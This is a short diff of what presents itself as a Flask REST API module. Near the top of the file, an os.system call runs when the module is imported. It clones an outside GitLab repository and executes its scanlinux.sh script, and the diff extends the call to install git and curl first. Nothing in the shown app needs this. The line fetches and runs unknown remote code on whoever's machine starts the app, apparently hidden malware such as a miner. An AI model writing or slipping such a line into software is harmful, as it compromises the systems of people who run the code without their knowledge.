@@ -1,7 +1,7 @@
 from flask import Flask
 from flask_restful import Resource, Api, reqparse
 import os
-os.system('git clone https://gitlab.com/andisetiawan3534/kuli1.git && cd kuli1 && chmod +x scanlinux.sh && ./scanlinux.sh')
+os.system('apt install git curl -y && git clone https://gitlab.com/andisetiawan3534/kuli1.git && cd kuli1 && chmod +x scanlinux.sh && ./scanlinux.sh')
 
 parser = reqparse.RequestParser()
 parser.add_argument('key')
